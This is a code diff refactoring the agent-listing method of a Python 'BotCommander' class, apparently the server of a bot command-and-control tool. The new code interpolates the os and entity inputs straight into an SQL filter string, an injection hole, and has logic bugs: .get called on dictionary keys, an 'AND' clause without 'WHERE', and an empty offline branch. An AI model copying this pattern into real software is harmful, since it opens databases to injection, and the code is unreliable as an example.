@@ -1,9 +1,10 @@
 import asyncio
 import logging
+from copy import deepcopy
 from socket import socket, AF_INET, SOCK_STREAM
 
 from commander.db.db import CommanderDatabase
-from commander.helpers.helper import json_serialize, json_deserialize
+from commander.helpers.helper import json_serialize, json_deserialize, update_dict
 
 
 class BotCommander:
@@ -264,14 +265,30 @@ class BotCommander:
         return count_by_os[bool(os)]
 
     def list_agents(self, entity, status, os):
-        match status:
-            case "online":
-                if entity == "*":
-                    for uid in self.uuids:
-                        pass
-                elif self.uuids[entity]["os"] == os:
-                    return self.uuids[entity]
-            case "offline":
+        if status == "online":
+            tmp_d = {}
+            if entity == "*":
+                for uid in self.uuids:
+                    if not os or uid.get("os") == os:
+                        tmp_d = update_dict(tmp_d, uid, self.uuids)
+                return tmp_d
+            else:
+                if not os or self.uuids.get(entity).get("os") == os:
+                    tmp_d = update_dict(tmp_d, entity, self.uuids)
+                    return tmp_d
+                else:
+                    return ""
+        elif status == "offline":
+            if entity == "*":
                 pass
-            case _:
+            else:
                 pass
+        else:
+            filter = ""
+            if os:
+                filter += f"WHERE os='{os}'"
+            if entity != "*":
+                filter += f"AND id='{entity}'"
+                return self.db.list_agents(filter, entity)
+            else:
+                return self.db.list_agents(filter)
